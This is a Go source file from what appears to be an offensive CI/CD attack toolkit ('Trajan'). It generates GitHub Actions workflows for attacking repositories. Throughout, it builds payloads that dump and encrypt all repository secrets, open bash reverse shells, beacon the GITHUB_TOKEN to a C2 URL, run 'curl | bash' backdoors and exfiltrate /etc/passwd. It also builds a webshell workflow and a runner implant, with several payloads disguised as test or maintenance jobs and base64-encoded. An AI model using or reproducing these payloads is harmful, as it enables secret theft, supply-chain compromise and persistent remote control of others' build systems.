package common

import (
	"encoding/base64"
	"fmt"
	"strings"
)

// SecretsDumpPayload generates a workflow that dumps secrets to logs
func SecretsDumpPayload(secretNames []string) string {
	var steps []string

	if len(secretNames) == 0 {
		// Dump all available secrets
		steps = append(steps, `      - name: Dump Secrets
        run: |
          echo "GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}"
          echo "All secrets: ${{ toJSON(secrets) }}"`)
	} else {
		// Dump specific secrets
		for _, name := range secretNames {
			steps = append(steps, fmt.Sprintf(`      - name: Dump Secret %s
        run: echo "%s: ${{ secrets.%s }}"`, name, name, name))
		}
	}

	workflow := fmt.Sprintf(`name: Secrets Dump (Trajan Attack)
on:
  workflow_dispatch:
jobs:
  dump:
    runs-on: ubuntu-latest
    steps:
%s`, strings.Join(steps, "\n"))

	return workflow
}

// SecretsDumpPayloadBase64 returns base64-encoded secrets dump workflow
func SecretsDumpPayloadBase64(secretNames []string) string {
	payload := SecretsDumpPayload(secretNames)
	return base64.StdEncoding.EncodeToString([]byte(payload))
}

// ReverseShellPayload generates a reverse shell command
func ReverseShellPayload(host string, port int) string {
	return fmt.Sprintf("bash -i >& /dev/tcp/%s/%d 0>&1", host, port)
}

// ReverseShellWorkflowPayload generates a workflow with reverse shell
func ReverseShellWorkflowPayload(host string, port int) string {
	workflow := fmt.Sprintf(`name: Runner Shell (Trajan Attack)
on:
  workflow_dispatch:
jobs:
  shell:
    runs-on: ubuntu-latest
    steps:
      - name: Reverse Shell
        run: |
          %s`, ReverseShellPayload(host, port))

	return workflow
}

// ReverseShellWorkflowPayloadBase64 returns base64-encoded reverse shell workflow
func ReverseShellWorkflowPayloadBase64(host string, port int) string {
	payload := ReverseShellWorkflowPayload(host, port)
	return base64.StdEncoding.EncodeToString([]byte(payload))
}

// C2WorkflowPayload generates a C2 callback workflow
func C2WorkflowPayload(c2URL string) string {
	workflow := fmt.Sprintf(`name: C2 Beacon (Trajan Attack)
on:
  schedule:
    - cron: '*/5 * * * *'  # Every 5 minutes
  workflow_dispatch:
jobs:
  beacon:
    runs-on: ubuntu-latest
    steps:
      - name: C2 Callback
        run: |
          curl -X POST %s \
            -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
            -d "runner_id=${{ runner.name }}"`, c2URL)

	return workflow
}

// C2WorkflowPayloadBase64 returns base64-encoded C2 workflow
func C2WorkflowPayloadBase64(c2URL string) string {
	payload := C2WorkflowPayload(c2URL)
	return base64.StdEncoding.EncodeToString([]byte(payload))
}

// InjectionPayload generates a simple command injection payload
func InjectionPayload(command string) string {
	// Wrap in shell to ensure execution
	return fmt.Sprintf("$(echo '%s' | base64 -d | bash)", base64.StdEncoding.EncodeToString([]byte(command)))
}

// PersistenceWorkflowPayload generates a workflow that creates persistence
func PersistenceWorkflowPayload(backdoorURL string) string {
	workflow := fmt.Sprintf(`name: Persistence (Trajan Attack)
on:
  push:
    branches: [main, master]
  workflow_dispatch:
jobs:
  persist:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - name: Install Backdoor
        run: |
          curl -fsSL %s | bash
          echo "Backdoor installed"`, backdoorURL)

	return workflow
}

// PersistenceWorkflowPayloadBase64 returns base64-encoded persistence workflow
func PersistenceWorkflowPayloadBase64(backdoorURL string) string {
	payload := PersistenceWorkflowPayload(backdoorURL)
	return base64.StdEncoding.EncodeToString([]byte(payload))
}

// DataExfiltrationPayload generates a payload that exfiltrates data to external server
func DataExfiltrationPayload(exfilURL string, dataPath string) string {
	if dataPath == "" {
		dataPath = "/etc/passwd"
	}

	return fmt.Sprintf(`curl -X POST %s -F "data=@%s"`, exfilURL, dataPath)
}

// WorkflowInjectionPayload generates malicious YAML for workflow injection
func WorkflowInjectionPayload(command string) string {
	workflow := fmt.Sprintf(`
      - name: Malicious Step (Trajan Attack)
        run: |
          %s`, command)

	return workflow
}

// PRAttackPayload generates a malicious workflow file for PR attack
func PRAttackPayload(command string) string {
	workflow := fmt.Sprintf(`name: PR Attack (Trajan)
on:
  pull_request_target:
    types: [opened, synchronize]
jobs:
  attack:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
        with:
          ref: ${{ github.event.pull_request.head.sha }}
      - name: Execute Attack
        run: |
          %s`, command)

	return workflow
}

// PRAttackPayloadBase64 returns base64-encoded PR attack workflow
func PRAttackPayloadBase64(command string) string {
	payload := PRAttackPayload(command)
	return base64.StdEncoding.EncodeToString([]byte(payload))
}

// EncodeBase64 is a helper to encode arbitrary content
func EncodeBase64(content string) string {
	return base64.StdEncoding.EncodeToString([]byte(content))
}

// DecodeBase64 is a helper to decode base64 content
func DecodeBase64(encoded string) (string, error) {
	decoded, err := base64.StdEncoding.DecodeString(encoded)
	if err != nil {
		return "", fmt.Errorf("decoding base64: %w", err)
	}
	return string(decoded), nil
}

// WebshellWorkflowPayload generates the C2 webshell workflow
func WebshellWorkflowPayload() string {
	return `name: Web Shell
run-name: Shell - ${{ inputs.runner }} - ${{ inputs.cmd || inputs.download_file }}

on:
  workflow_dispatch:
    inputs:
      cmd:
        description: "Command"
        required: false
        type: string
      runner:
        description: "Runner"
        required: true
        type: string
      download_file:
        description: "Download a file instead of running a command."
        required: false
        type: string

jobs:
  build:
    runs-on: ${{ inputs.runner }}
    steps:
      - name: Run
        if: ${{ !inputs.download_file }}
        env:
          RUNNER_TRACKING_ID: 0
        run: ${{ inputs.cmd }}
        continue-on-error: true
      - name: Exfil
        if: ${{ inputs.download_file }}
        continue-on-error: true
        uses: actions/upload-artifact@v4
        with:
          path: ${{ inputs.download_file }}
          name: result`
}

// WebshellWorkflowPayloadBase64 returns base64-encoded webshell workflow
func WebshellWorkflowPayloadBase64() string {
	return EncodeBase64(WebshellWorkflowPayload())
}

// RoRGistPayload generates the runner implant script
func RoRGistPayload(registrationToken, c2Repo, releaseFile, version string, keepAlive bool, runnerName string) string {
	keepAliveStr := "false"
	if keepAlive {
		keepAliveStr = "true"
	}

	return fmt.Sprintf(`REG_TOKEN=$(echo "%s" | base64 -d)
C2_REPO=%s
KEEP_ALIVE=%s
export WORKER_LOGRETENTION=1
export RUNNER_LOGRETENTION=1
mkdir -p $HOME/.actions-runner1/ && cd $HOME/.actions-runner1/
curl -o %s -L https://github.com/actions/runner/releases/download/%s/%s > /dev/null 2>&1
tar xzf ./%s
export RUNNER_ALLOW_RUNASROOT="1"
./config.sh --url https://github.com/$C2_REPO --unattended --token $REG_TOKEN --name "trajan-%s" --labels "trajan-%s" > /dev/null 2>&1
rm %s

if [ "$KEEP_ALIVE" = true ]; then
    export RUNNER_TRACKING_ID=0 && ./run.sh > /dev/null 2>&1
else
    export RUNNER_TRACKING_ID=0 && nohup ./run.sh > /dev/null 2>&1 &
fi`,
		base64.StdEncoding.EncodeToString([]byte(registrationToken)),
		c2Repo, keepAliveStr, releaseFile, version, releaseFile,
		releaseFile, runnerName, runnerName, releaseFile)
}

// RoRWorkflowPayload generates workflow that pulls implant from gist
func RoRWorkflowPayload(gistURL, runnerLabels, targetOS string) string {
	var runPayload string
	if targetOS == "win" {
		runPayload = fmt.Sprintf("curl -sSfL %s | powershell *> $null", gistURL)
	} else {
		runPayload = fmt.Sprintf("curl -sSfL %s | bash > /dev/null 2>&1", gistURL)
	}

	return fmt.Sprintf(`name: Testing
run-name: Testing

on:
  pull_request:

jobs:
  testing:
    runs-on: [%s]
    steps:
      - name: Run Tests
        run: %s
        continue-on-error: true`, runnerLabels, runPayload)
}

// ScheduledBackdoorPayload generates a cron-based beacon workflow
func ScheduledBackdoorPayload(c2URL, cronSchedule string) string {
	return fmt.Sprintf(`name: Scheduled Maintenance
on:
  schedule:
    - cron: '%s'
  workflow_dispatch:
jobs:
  maintain:
    runs-on: ubuntu-latest
    steps:
      - name: Check Status
        run: |
          curl -X POST %s \
            -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
            -d "runner=${{ runner.name }}"`, cronSchedule, c2URL)
}

// ScheduledBackdoorPayloadBase64 returns base64-encoded scheduled backdoor workflow
func ScheduledBackdoorPayloadBase64(c2URL, cronSchedule string) string {
	return EncodeBase64(ScheduledBackdoorPayload(c2URL, cronSchedule))
}

// EncryptedSecretsDumpPayload generates an encrypted secrets dump workflow.
//
// The workflow:
// 1. Dumps all secrets to output.json using toJSON(secrets)
// 2. Generates a random AES key (12 hex chars)
// 3. Encrypts output.json with OpenSSL AES-256-CBC + PBKDF2
// 4. Encrypts the AES key with the provided RSA public key
// 5. Uploads both encrypted files as artifacts (output_updated.json and lookup.txt)
//
// Parameters:
//   - publicKeyPEM: RSA public key in PEM format
//   - branchName: Branch name to trigger the workflow on push
func EncryptedSecretsDumpPayload(publicKeyPEM, branchName string) string {
	// Indent PEM continuation lines to match YAML block scalar indentation (12 spaces)
	indentedPEM := strings.ReplaceAll(strings.TrimSpace(publicKeyPEM), "\n", "\n            ")

	workflow := fmt.Sprintf(`name: %s
on:
  push:
    branches:
      - %s
jobs:
  testing:
    runs-on: ubuntu-latest
    steps:
      - name: Prepare repository
        env:
          VALUES: ${{ toJSON(secrets) }}
        run: |
          cat <<EOF > output.json
          $VALUES
          EOF
      - name: Run Tests
        env:
          PUBKEY: |
            %s
        run: |
          aes_key=$(openssl rand -hex 12 | tr -d '\n')
          openssl enc -aes-256-cbc -pbkdf2 -in output.json -out output_updated.json -pass pass:$aes_key
          echo $aes_key | openssl pkeyutl -encrypt -pubin -inkey <(echo "$PUBKEY") -out lookup.txt 2>/dev/null
      - name: Upload artifacts
        uses: actions/upload-artifact@v4
        with:
          name: files
          path: |
            output_updated.json
            lookup.txt
`, branchName, branchName, indentedPEM)

	return workflow
}

// EncryptedSecretsDumpPayloadBase64 returns base64-encoded encrypted secrets dump workflow
func EncryptedSecretsDumpPayloadBase64(publicKeyPEM, branchName string) string {
	payload := EncryptedSecretsDumpPayload(publicKeyPEM, branchName)
	return base64.StdEncoding.EncodeToString([]byte(payload))
}
